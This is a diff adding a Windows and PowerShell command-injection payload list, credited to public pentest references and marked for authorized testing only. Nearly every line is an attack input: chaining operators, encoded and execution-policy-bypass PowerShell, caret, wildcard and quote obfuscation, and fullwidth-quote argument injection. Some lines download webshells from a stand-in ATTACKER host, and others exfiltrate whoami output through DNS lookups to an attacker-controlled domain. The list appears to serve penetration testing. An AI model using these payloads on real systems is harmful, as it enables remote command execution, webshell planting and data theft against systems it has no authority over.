@@ -1,0 +1,89 @@
+# Windows / PowerShell command injection — PAT Command Injection README + PortSwigger
+# Authorized testing only.
+
+# === Chaining ===
+& whoami
+&& whoami
+|| whoami
+| whoami
+; whoami
+
+# === Basic execution ===
+whoami
+cmd /c whoami
+cmd.exe /c whoami
+powershell -c whoami
+powershell.exe -Command whoami
+powershell -nop -c whoami
+powershell -ep bypass -c whoami
+
+# === PowerShell encoded ===
+powershell -enc dwBoAG8AYQBtAGkA
+powershell -e dwBoAG8AYQBtAGkA
+
+# === Argument injection ===
+ping -n 1 127.0.0.1&whoami
+ping -n 1 127.0.0.1&&whoami
+ping -n 1 127.0.0.1|whoami
+ping -n 1 127.0.0.1||whoami
+ping -n 1 127.0.0.1;whoami
+
+# === Space bypass (Windows) ===
+ping%CommonProgramFiles:~10,-18%127.0.0.1
+ping%PROGRAMFILES:~10,-5%127.0.0.1
+ping%SystemRoot:~0,1%Windows%SystemRoot:~0,1%System32%SystemRoot:~0,1%whoami
+
+# === Caret obfuscation ===
+@^p^o^w^e^r^shell whoami
+c^md /c whoami
+w^h^o^a^m^i
+
+# === Wildcard obfuscation ===
+powershell C:\*\*2\n??e*d.*?
+@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e
+
+# === Case variation ===
+wHoAmi
+WHOAMI
+WhOaMi
+
+# === Backtick / quote bypass ===
+w"h"o"am"i
+wh""oami
+w'h'o'am'i
+
+# === Environment variable substring ===
+%COMSPEC% /c whoami
+%WINDIR%\System32\whoami.exe
+
+# === Worstfit / fullwidth quote argument injection ===
+＂ --use-askpass=calc ＂
+chrome '--gpu-launcher="whoami > C:\temp\out.txt"'
+
+# === Curl redirect to webshell ===
+curl http://ATTACKER/webshell.php -o webshell.php
+curl http://ATTACKER/shell.aspx -o shell.aspx
+
+# === Time-based blind ===
+ping -n 6 127.0.0.1
+timeout /t 5
+powershell Start-Sleep -s 5
+
+# === OOB exfil (DNS) ===
+nslookup ATTACKER.oastify.com
+powershell nslookup $(whoami).ATTACKER.oastify.com
+
+# === Polyglot fragments ===
+& whoami&
+&& whoami&&
+| whoami|
+; whoami;
+%0awhoami
+%0d%0awhoami
+
+# === Remove trailing args ===
+whoami --
+ping 127.0.0.1 --
+
+# === Background long-running ===
+start /b ping -n 30 127.0.0.1
